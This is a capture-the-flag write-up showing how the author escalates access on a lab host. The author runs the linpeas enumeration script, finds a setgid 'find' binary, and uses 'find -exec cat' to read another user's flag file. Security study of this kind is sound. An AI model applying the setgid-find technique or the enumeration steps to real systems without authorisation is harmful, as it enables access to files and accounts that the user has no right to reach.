# Finders Keepers

## Description
```
Patch found a flag! He stored it in his home directory... should be able to keep it? 
```

## Writeup

Starting off we received credentials to connect to a machine. <br/>
```sh
kali@kali ssh -p 32465 user@challenge.ctf.games
user@challenge.ctf.games's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.109+ x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@finders-keepers-429f5e8d3093496b-8597bf885b-jtf5n:~$ whoami
user
user@finders-keepers-429f5e8d3093496b-8597bf885b-jtf5n:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

Looking for suspicious user. <br/>
```sh
user@finders-keepers-ef72e864bc057c1c-df56bd8cb-hkbsx:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/bash
patch:x:1001:1001::/home/patch:/bin/bash
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
user@finders-keepers-ef72e864bc057c1c-df56bd8cb-hkbsx:~$ ls -la /home/
total 20
drwxr-xr-x 1 root  root  4096 Oct 26 22:22 .
drwxr-xr-x 1 root  root  4096 Oct 27 18:10 ..
drwxr-x--- 1 patch patch 4096 Oct 26 22:23 patch
drwxr-x--- 1 user  user  4096 Oct 27 18:10 user
```

This doesn't get us far as we got no access to directory patch whatsoever. <br/>
Being efficient I use `linpeas` to look for priviledge escalation or any kind of access. <br/>
```sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231024-f6adaa47/linpeas.sh
-----------------------------------------------------------------------------------------------------------
Saving to: ‘linpeas.sh’

linpeas.sh                          100%[===================================================================>] 827.94K  --.-KB/s    in 0.05s   

2023-10-27 18:12:53 (15.5 MB/s) - ‘linpeas.sh’ saved [847815/847815]

user@finders-keepers-1e642c2a86a4775b-7dc7c4ddb9-ddvft:~$ ./linpeas.sh
```

This gets us some interesting things like the one below. <br/>
```sh
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                
-rwxr-sr-x 1 root shadow 71K Nov 24  2022 /usr/bin/chage                                                                                        
-rwxr-sr-x 1 root shadow 23K Nov 24  2022 /usr/bin/expiry
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/wall
-rwxr-sr-x 1 root patch 276K Mar 23  2022 /usr/bin/find
-rwxr-sr-x 1 root _ssh 287K Aug 24 13:40 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 27K Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
```

Seems like we can execute the binary `find` in the user directory patch. <br/>
```sh
user@finders-keepers-1e642c2a86a4775b-7dc7c4ddb9-ddvft:~$ find /home/patch/
/home/patch/
/home/patch/.bash_logout
/home/patch/.profile
/home/patch/.bashrc
/home/patch/flag.txt
```

Knowing this we can just edit the find command to additionally pipe the content of the files. <br/>
```sh
user@finders-keepers-1e642c2a86a4775b-7dc7c4ddb9-ddvft:~$ find /home/patch -type f -exec cat {} \;

---------------------------------------------------------------
flag{e4bd38e78379a5a0b29f047b91598add}
```

